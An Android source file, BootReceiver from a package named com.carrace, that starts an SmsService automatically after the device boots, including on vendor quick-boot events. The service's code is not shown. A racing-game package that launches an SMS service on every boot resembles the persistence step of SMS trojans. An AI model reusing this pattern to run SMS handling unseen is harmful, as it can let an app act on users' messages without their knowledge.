package com.carrace;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        String a = intent.getAction();
        if (!Intent.ACTION_BOOT_COMPLETED.equals(a)
                && !"android.intent.action.QUICKBOOT_POWERON".equals(a)
                && !"com.htc.intent.action.QUICKBOOT_POWERON".equals(a)) return;
        Intent svc = new Intent(context, SmsService.class);
        if (Build.VERSION.SDK_INT >= 26) context.startForegroundService(svc);
        else context.startService(svc);
    }
}
